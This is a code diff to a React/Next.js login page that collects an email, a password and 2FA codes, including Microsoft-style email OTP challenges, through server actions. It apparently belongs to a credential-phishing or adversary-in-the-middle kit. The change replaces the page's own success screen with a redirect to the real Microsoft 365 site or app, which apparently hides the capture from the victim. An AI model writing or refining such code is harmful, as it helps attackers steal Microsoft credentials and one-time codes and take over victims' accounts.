@@ -6,7 +6,7 @@ import Image from "next/image";
 
 import { initiateLogin, submit2FA, submitPassword } from "./actions";
 
-type LoginStep = "email" | "password" | "2fa" | "success";
+type LoginStep = "email" | "password" | "2fa";
 
 export default function Home() {
   const [step, setStep] = useState<LoginStep>("email");
@@ -19,6 +19,32 @@ export default function Home() {
   const [error, setError] = useState<string | null>(null);
   const [challengeType, setChallengeType] = useState<string | null>(null);
   const [challengeMetadata, setChallengeMetadata] = useState<any>(null);
+
+  // Redirect to Microsoft after successful authentication
+  const redirectToMicrosoft = () => {
+    const webUrl = "https://www.microsoft365.com";
+
+    const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent);
+    const isAndroid = /Android/.test(navigator.userAgent);
+
+    let appUrl: string | null = null;
+
+    if (isIOS) {
+      appUrl = "microsoft-edge-http://www.microsoft365.com";
+    } else if (isAndroid) {
+      appUrl =
+        "intent://www.microsoft365.com#Intent;scheme=https;package=com.microsoft.launcher.enterprise;end";
+    }
+
+    if (appUrl) {
+      window.open(appUrl, "_self");
+      setTimeout(() => {
+        window.location.href = webUrl;
+      }, 1500);
+    } else {
+      window.location.href = webUrl;
+    }
+  };
 
   const handleEmailSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -35,10 +61,10 @@ export default function Home() {
         if (data.status === "REQUIRES_PASSWORD") {
           setStep("password");
         } else if (data.status === "AUTHENTICATED") {
-          setStep("success");
+          redirectToMicrosoft();
         } else {
           // Handle other statuses if necessary
-          setStep("password");
+          setStep("password"); // fallback
         }
       } else {
         setError(message || data?.message || "Failed to initiate login");
@@ -70,9 +96,9 @@ export default function Home() {
           data.status === "AUTHENTICATED" ||
           data.status === "COMPLETED"
         ) {
-          setStep("success");
+          redirectToMicrosoft();
         } else {
-          setStep("success"); // Default to success if success=true but status is unknown
+          redirectToMicrosoft(); // Default redirect if success=true but status is unknown
         }
       } else {
         // Check for 2FA even if success is false but data contains challenge
@@ -108,7 +134,7 @@ export default function Home() {
       const { success, data, message } = await submit2FA({ sessionId, code: twoFACode });
 
       if (success && data.success) {
-        setStep("success");
+        redirectToMicrosoft();
       } else {
         // Handle multi-step verification (EMAIL_ADDRESS -> EMAIL_OTP)
         if (data?.challengeType) {
@@ -422,14 +448,7 @@ export default function Home() {
           {/* 2FA Step */}
           {step === "2fa" && render2FAStep()}
 
-          {/* Success Step */}
-          {step === "success" && (
-            <div style={{ textAlign: "center", padding: "2rem 0" }}>
-              <div style={{ fontSize: "3rem", marginBottom: "1rem" }}>✅</div>
-              <h1 className={styles.heading}>Success!</h1>
-              <p>You have successfully authenticated.</p>
-            </div>
-          )}
+
         </div>
 
         {(step === "email" || step === "password" || step === "2fa") && (
